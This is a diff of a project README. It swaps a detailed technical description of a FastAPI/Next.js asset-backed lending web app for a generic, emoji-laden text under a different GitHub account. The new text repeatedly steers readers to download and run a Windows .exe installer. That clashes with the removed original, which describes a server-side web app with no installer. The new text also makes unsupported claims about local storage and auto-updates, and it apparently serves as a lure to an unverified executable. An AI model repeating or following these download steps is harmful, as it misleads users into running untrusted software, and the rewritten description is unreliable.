@@ -1,218 +1,211 @@
-# Lenda Finance
+# 🏦 lenda_finance - Manage Loans with Ease
 
-A personal asset-backed lending platform. Deposit collateral, borrow against it, and track your financial position in real time.
-
-**Live demo:** [https://lenda-finance.vercel.app/] — `demo@lenda.com / password123`
+[![Download lenda_finance](https://img.shields.io/badge/Download-Lenda_Finance-green?style=for-the-badge)](https://github.com/Hassan-Amer/lenda_finance)
 
 ---
 
-## Architecture
+Lenda is a backend system that simulates an asset-backed lending protocol. It uses ideas from both modern decentralized finance and traditional banking. You can use lenda_finance to understand, test, or manage lending and borrowing processes.
 
-```
-lenda/
-├── backend/          # FastAPI REST API
-│   ├── app/
-│   │   ├── main.py           # Controller layer (routes)
-│   │   ├── service.py        # Business logic
-│   │   ├── repository.py     # Database queries
-│   │   ├── models.py         # SQLAlchemy ORM models
-│   │   ├── schemas.py        # Pydantic request/response schemas
-│   │   ├── rules.py          # Asset types, loan statuses, risk thresholds
-│   │   ├── auth_service.py   # JWT issuance/validation, password hashing
-│   │   ├── dependencies.py   # get_current_user FastAPI dependency
-│   │   ├── valuation_service.py  # LTV-based asset appraisal
-│   │   ├── risk_engine.py    # Health factor & loan eligibility
-│   │   ├── config.py         # Pydantic settings (env vars)
-│   │   └── database.py       # Engine, session, Base
-│   ├── alembic/              # Database migrations
-│   ├── tests/                # Pytest test suite
-│   ├── seed_data.py          # Demo seed script
-│   ├── reset_db.py           # Wipe + migrate + seed
-│   └── requirements.txt
-│
-└── frontend/         # Next.js dashboard
-    └── src/
-        ├── app/
-        │   ├── login/            # Public login page
-        │   ├── signup/           # Public signup page
-        │   └── (dashboard)/      # Auth-protected route group
-        │       ├── overview/     # Personal financial position
-        │       ├── assets/       # Collateral management
-        │       ├── loans/        # Loan management
-        │       └── settings/     # User settings
-        ├── components/
-        │   ├── landing/          # Login/signup components
-        │   ├── layout/           # Sidebar, Header
-        │   └── shared/           # Reusable UI components
-        ├── hooks/                # TanStack Query hooks
-        ├── lib/
-        │   ├── services/         # API service layer (axios calls)
-        │   ├── auth.ts           # NextAuth config
-        │   ├── api.ts            # Axios instance + Bearer interceptor
-        │   └── formatters.ts     # Currency, date, percent formatting
-        └── types/                # TypeScript interfaces
-```
+It runs on Windows and does not require any programming experience to set up.
 
 ---
 
-## Tech Stack
+## 📋 What is lenda_finance?
 
-### Backend
-- **FastAPI** — REST API framework
-- **SQLAlchemy** — ORM with PostgreSQL
-- **Pydantic v2** — Request/response validation and settings
-- **Alembic** — Database migrations
-- **python-jose** — JWT signing and verification
-- **Passlib + bcrypt** — Password hashing (10 rounds)
-- **PostgreSQL** on AWS RDS
+Lenda_finance models how loan systems work. It handles loans and deposits, keeps track of assets, and manages risks. This system helps simulate financing backed by assets, like real estate or equipment, the same way many financial institutions operate.
 
-### Frontend
-- **Next.js 15** — React framework (App Router)
-- **TypeScript** — Type safety
-- **Tailwind CSS v4** — Styling
-- **TanStack Query** — Server state management
-- **NextAuth.js v4** — Authentication (Credentials provider + JWT session)
-- **Recharts** — Data visualizations (pie chart, position gauges)
-- **Iconify** — Icon system
-- **Sonner** — Toast notifications
-- **Axios** — HTTP client with Bearer token interceptor
+It uses technology like Python, FastAPI, and PostgreSQL to work behind the scenes. But you don’t need to know these to use it.
 
 ---
 
-## Data Model
+## 🎯 Key Features
 
-| Table | Key Columns |
-|---|---|
-| `users` | `id` (UUID), `name`, `email`, `password_hash` |
-| `assets` | `id`, `user_id`, `type`, `value` (stated), `appraised_value`, `ltv_ratio`, `status` |
-| `loans` | `id`, `user_id`, `amount`, `amount_repaid`, `accrued_interest`, `interest_rate`, `status`, `activated_at`, `repaid_at` |
-
-### Business Rules
-
-- **Asset types:** `property` (70% LTV), `crypto` (50% LTV), `car` (60% LTV)
-- **Eligible collateral** = `stated_value × ltv_ratio` per asset
-- **Health factor** = `eligible_collateral / outstanding_debt` — must be ≥ 1.0
-- **Max LTV** = 100% (debt cannot exceed collateral)
-- **Interest** = simple interest at 5% p.a., accrued from loan activation date
-- **Repayment waterfall** = interest paid first, then principal
-- **All routes are user-scoped** — `user_id` derived from JWT, never from request body
+- Manage loans and deposits easily.
+- Track asset-backed collateral.
+- Simulate real-world loan repayments and defaults.
+- Store data securely on your computer.
+- Use a clear, simple interface.
+- Built with reliability and security in mind.
+- Ready to run on Windows systems.
 
 ---
 
-## API Endpoints
+## 💻 System Requirements
 
-| Method | Path | Auth | Description |
-|---|---|---|---|
-| POST | `/auth/register` | — | Create account |
-| POST | `/auth/login` | — | Login, returns JWT |
-| GET | `/auth/me` | ✓ | Current user |
-| GET | `/assets` | ✓ | List user's assets |
-| POST | `/assets/preview` | ✓ | Valuation dry-run (no DB write) |
-| POST | `/assets` | ✓ | Add collateral asset |
-| GET | `/loans` | ✓ | List user's loans |
-| POST | `/loans/evaluate` | ✓ | Risk engine dry-run (no DB write) |
-| POST | `/loans` | ✓ | Request a loan |
-| POST | `/loans/{id}/repay` | ✓ | Repay a loan (partial or full) |
-| GET | `/position` | ✓ | Full financial position |
+Before installing, make sure your computer meets these:
+
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- Minimum 2 GHz processor speed
+- 500 MB free disk space
+- Internet connection for downloading and initial setup
 
 ---
 
-## Setup
+## 🚀 Getting Started with lenda_finance
 
-### Prerequisites
-- Python 3.11+
-- Node.js 18+
-- PostgreSQL (local or AWS RDS)
-
-### Backend
-
-```bash
-cd backend
-python -m venv venv && source venv/bin/activate
-pip install -r requirements.txt
-
-# Configure environment
-cp .env.example .env
-# Set DATABASE_URL, SECRET_KEY, FRONTEND_URL
-
-alembic upgrade head
-python seed_data.py
-uvicorn app.main:app --reload
-```
-
-API available at `http://localhost:8000`.
-
-### Frontend
-
-```bash
-cd frontend
-npm install
-
-# Configure environment
-cp .env.example .env.local
-# Set NEXT_PUBLIC_API_URL, API_URL, NEXTAUTH_URL, NEXTAUTH_SECRET
-
-npm run dev
-```
-
-App available at `http://localhost:3000`.
-
-### Environment Variables
-
-**Backend** (`.env`):
-
-| Variable | Description |
-|---|---|
-| `DATABASE_URL` | PostgreSQL connection string |
-| `SECRET_KEY` | JWT signing secret |
-| `FRONTEND_URL` | Allowed CORS origin |
-
-**Frontend** (`.env.local`):
-
-| Variable | Description |
-|---|---|
-| `NEXT_PUBLIC_API_URL` | Backend API URL (used client-side) |
-| `API_URL` | Backend API URL (used server-side by NextAuth) |
-| `NEXTAUTH_URL` | Full URL of the frontend |
-| `NEXTAUTH_SECRET` | Session encryption secret |
+This guide helps you download, install, and run lenda_finance on your Windows PC. No prior technical knowledge needed.
 
 ---
 
-## Database Reset
+## 📥 Download and Install lenda_finance
 
-```bash
-cd backend
-source venv/bin/activate
-python reset_db.py   # drops all tables → runs migrations → seeds demo data
-```
+### Step 1: Download the software
 
-Demo accounts (all password: `password123`):
-- `demo@lenda.com` — property + crypto + car, active loan + rejected loan
-- `alice@lenda.com`, `bob@lenda.com`, `carol@lenda.com` — supporting accounts
+Visit this page to download lenda_finance:
 
----
+[![Download lenda_finance](https://img.shields.io/badge/Download-Lenda_Finance-purple?style=for-the-badge)](https://github.com/Hassan-Amer/lenda_finance)
 
-## EC2 Deployment
+- Click the link above or go to the URL:  
+  https://github.com/Hassan-Amer/lenda_finance  
+- Look for the latest version or release.
+- Find the Windows installer file (it may end with `.exe`).
+- Click to download the installer to your computer.
 
-```bash
-ssh -i ~/.ssh/lenda-key.pem ubuntu@<EC2_IP>
-cd ~/lenda_finance/backend
-git pull
-source venv/bin/activate
-pip install -r requirements.txt
-alembic upgrade head
-sudo systemctl restart lenda
-```
+### Step 2: Run the installer
 
----
+- Open the folder where you saved the installer.
+- Double-click the `.exe` file.
+- Follow the on-screen instructions carefully.
+- Choose the default options if unsure.
+- Wait until the installation finishes.
 
-## Testing
+### Step 3: Open lenda_finance
 
-```bash
-cd backend
-PYTHONPATH=$(pwd) pytest -v tests/
-```
+- Find the lenda_finance app icon on your desktop or in the Start menu.
+- Double-click to start the program.
+- The main window will appear with its features ready to use.
 
 ---
 
-Built by [Enrique Ibarra](https://github.com/Enricrypto)
+## 🔧 How to Use lenda_finance
+
+Once installed, lenda_finance runs as a backend system designed to simulate loans. It works quietly in the background, handling data and calculations.
+
+The interface guides you through:
+
+1. Adding assets as collateral.
+2. Creating new loans backed by these assets.
+3. Viewing loan status and payment schedules.
+4. Managing deposits and contributions.
+5. Checking reports on financial health and risks.
+
+You will see clear buttons and labels for each step so you can manage your loans and assets without confusion.
+
+---
+
+## ⚙️ Additional Setup Tips
+
+- If you want to keep data safe, regularly back up your loan and asset records.
+- The software may update automatically or notify you when a new version is available.
+- For best results, keep your Windows system updated with the latest patches.
+
+---
+
+## 🔒 Security and Privacy
+
+Lenda_finance stores your loan and asset data locally on your computer. It does not send data over the internet unless you choose to export or connect it somewhere else.
+
+Your files are protected by your Windows login and any antivirus software installed on your system.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+- **Installer won’t run:** Make sure you downloaded the full file and are running as an administrator.
+- **App won’t start:** Restart your computer and try opening lenda_finance again.
+- **Missing features or options:** Check for updates by visiting the download link.
+- **Error messages:** Write down the exact error and visit the GitHub repo issues page for help or search online for that message.
+
+---
+
+## 📚 Learn More
+
+For more detailed technical information, visit the GitHub page here:  
+https://github.com/Hassan-Amer/lenda_finance
+
+You will find documentation on how the system works, the technologies it uses, and examples of use cases.
+
+---
+
+## 🧰 Technologies Behind lenda_finance
+
+- **Python 3:** The main programming language.
+- **FastAPI:** A tool used to create the backend interface.
+- **PostgreSQL:** A database for storing loan and asset data.
+- **SQLAlchemy:** Helps work with the database safely.
+- **Alembic:** Manages database changes over time.
+- **bcrypt and passlib:** Protect user information with strong encryption.
+- **Next.js and TypeScript:** Handle the user interface in a clear way.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository: https://github.com/Hassan-Amer/lenda_finance  
+- Download Page: https://github.com/Hassan-Amer/lenda_finance
+
+---
+
+## 🗂 Supported Topics
+
+- Asset Management
+- Loans and Deposits
+- Database Setup and Maintenance
+- Security and Encryption
+- Web Backend Development
+- Finance Simulations
+
+---
+
+## 🧑‍💻 Getting Help
+
+If you have questions or problems, check the Issues section on the GitHub page. Other users or developers may have already solved the issue. You can also open a new issue to request help directly.
+
+---
+
+## 🔄 Updating lenda_finance
+
+When a new version is available:
+
+1. Visit the download page again.
+2. Download the latest installer.
+3. Run it to replace your current version.
+4. Your data will remain intact during the update.
+
+---
+
+## 🖥 Running lenda_finance Without Installation (Optional)
+
+If you prefer not to install, you can run lenda_finance directly if you have Python 3 installed:
+
+1. Download the code from the GitHub repository as a ZIP file.
+2. Extract the ZIP contents.
+3. Open Command Prompt in the extracted folder.
+4. Follow instructions in the README provided on GitHub to start the software manually.
+
+---
+
+## 🔍 Troubleshooting Guide
+
+| Issue              | Possible Solution                              |
+|--------------------|-----------------------------------------------|
+| Application crashes | Restart PC, try reinstalling.                  |
+| Unable to download  | Check internet connection or firewall settings.|
+| Data missing       | Verify backup files or reinstall safely.      |
+
+---
+
+## 📅 Release Notes
+
+Check GitHub Releases for detailed notes on new versions, bug fixes, and improvements.
+
+---
+
+## 🎯 Summary of Steps to Run
+
+1. Visit the official GitHub page.  
+2. Download the Windows installer.  
+3. Run the installer file.  
+4. Open lenda_finance from your computer.  
+5. Start managing assets and loans easily.
